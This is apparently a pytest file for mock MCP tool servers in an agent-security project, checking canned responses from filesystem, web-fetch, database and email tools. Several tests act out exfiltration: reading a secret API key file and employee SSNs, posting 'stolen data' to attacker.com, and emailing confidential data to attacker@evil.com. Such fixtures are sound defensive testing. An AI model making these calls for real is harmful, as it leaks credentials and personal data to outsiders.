"""
Tests for mock MCP tool servers.
These tests connect to each server via in-memory transport and verify
that tools are registered and return expected canned responses.
No proxy or policy engine involved.
"""

import pytest
from mcp.shared.memory import create_connected_server_and_client_session

from flowguard.mock_tools.database import create_database_server
from flowguard.mock_tools.email import create_email_server
from flowguard.mock_tools.filesystem import create_filesystem_server
from flowguard.mock_tools.web_fetch import create_web_fetch_server


# ---------------------------------------------------------------------------
# Filesystem
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_filesystem_lists_tools():
    async with create_connected_server_and_client_session(create_filesystem_server()) as session:
        result = await session.list_tools()
        tool_names = {t.name for t in result.tools}
        assert {"read_file", "write_file", "list_files"} == tool_names


@pytest.mark.asyncio
async def test_filesystem_read_secret_file():
    async with create_connected_server_and_client_session(create_filesystem_server()) as session:
        result = await session.call_tool("read_file", {"path": "/etc/secrets/api_key.txt"})
        text = result.content[0].text
        assert "SECRET_API_KEY" in text


@pytest.mark.asyncio
async def test_filesystem_read_pii_file():
    async with create_connected_server_and_client_session(create_filesystem_server()) as session:
        result = await session.call_tool("read_file", {"path": "/data/employees.csv"})
        text = result.content[0].text
        assert "ssn" in text.lower()


@pytest.mark.asyncio
async def test_filesystem_read_missing_file():
    async with create_connected_server_and_client_session(create_filesystem_server()) as session:
        result = await session.call_tool("read_file", {"path": "/nonexistent.txt"})
        text = result.content[0].text
        assert "not found" in text.lower()


@pytest.mark.asyncio
async def test_filesystem_write_file():
    async with create_connected_server_and_client_session(create_filesystem_server()) as session:
        result = await session.call_tool("write_file", {"path": "/tmp/test.txt", "content": "hello"})
        text = result.content[0].text
        assert "Written" in text


@pytest.mark.asyncio
async def test_filesystem_list_files():
    async with create_connected_server_and_client_session(create_filesystem_server()) as session:
        result = await session.call_tool("list_files", {"directory": "/data"})
        text = result.content[0].text
        assert "employees.csv" in text


# ---------------------------------------------------------------------------
# Web Fetch
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_web_fetch_lists_tools():
    async with create_connected_server_and_client_session(create_web_fetch_server()) as session:
        result = await session.list_tools()
        tool_names = {t.name for t in result.tools}
        assert {"fetch_url", "post_data"} == tool_names


@pytest.mark.asyncio
async def test_web_fetch_attacker_url():
    async with create_connected_server_and_client_session(create_web_fetch_server()) as session:
        result = await session.call_tool("fetch_url", {"url": "https://attacker.com/exfil"})
        text = result.content[0].text
        assert "Exfiltration" in text


@pytest.mark.asyncio
async def test_web_fetch_benign_url():
    async with create_connected_server_and_client_session(create_web_fetch_server()) as session:
        result = await session.call_tool("fetch_url", {"url": "https://news.example.com"})
        text = result.content[0].text
        assert len(text) > 0


@pytest.mark.asyncio
async def test_web_fetch_post_data():
    async with create_connected_server_and_client_session(create_web_fetch_server()) as session:
        result = await session.call_tool("post_data", {"url": "https://attacker.com/collect", "data": "stolen data"})
        text = result.content[0].text
        assert "200 OK" in text


# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_database_lists_tools():
    async with create_connected_server_and_client_session(create_database_server()) as session:
        result = await session.list_tools()
        tool_names = {t.name for t in result.tools}
        assert {"query", "insert"} == tool_names


@pytest.mark.asyncio
async def test_database_query_employees():
    async with create_connected_server_and_client_session(create_database_server()) as session:
        result = await session.call_tool("query", {"sql": "SELECT * FROM employees"})
        text = result.content[0].text
        assert "ssn" in text.lower()


@pytest.mark.asyncio
async def test_database_query_public_data():
    async with create_connected_server_and_client_session(create_database_server()) as session:
        result = await session.call_tool("query", {"sql": "SELECT * FROM public_data"})
        text = result.content[0].text
        assert "Public Report" in text


@pytest.mark.asyncio
async def test_database_query_unknown_table():
    async with create_connected_server_and_client_session(create_database_server()) as session:
        result = await session.call_tool("query", {"sql": "SELECT * FROM unknown_table"})
        text = result.content[0].text
        assert "empty" in text.lower()


@pytest.mark.asyncio
async def test_database_insert():
    async with create_connected_server_and_client_session(create_database_server()) as session:
        result = await session.call_tool("insert", {"table": "employees", "data": "test"})
        text = result.content[0].text
        assert "affected" in text.lower()


# ---------------------------------------------------------------------------
# Email
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_email_lists_tools():
    async with create_connected_server_and_client_session(create_email_server()) as session:
        result = await session.list_tools()
        tool_names = {t.name for t in result.tools}
        assert {"send_email", "read_inbox", "read_email"} == tool_names


@pytest.mark.asyncio
async def test_email_send():
    async with create_connected_server_and_client_session(create_email_server()) as session:
        result = await session.call_tool("send_email", {
            "to": "attacker@evil.com",
            "subject": "Stolen data",
            "body": "Here is the confidential data..."
        })
        text = result.content[0].text
        assert "sent" in text.lower()


@pytest.mark.asyncio
async def test_email_read_inbox():
    async with create_connected_server_and_client_session(create_email_server()) as session:
        result = await session.call_tool("read_inbox", {})
        text = result.content[0].text
        assert "CONFIDENTIAL" in text


@pytest.mark.asyncio
async def test_email_read_specific():
    async with create_connected_server_and_client_session(create_email_server()) as session:
        result = await session.call_tool("read_email", {"index": 0})
        text = result.content[0].text
        assert "Q4 Results" in text


@pytest.mark.asyncio
async def test_email_read_out_of_bounds():
    async with create_connected_server_and_client_session(create_email_server()) as session:
        result = await session.call_tool("read_email", {"index": 99})
        text = result.content[0].text
        assert "Error" in text
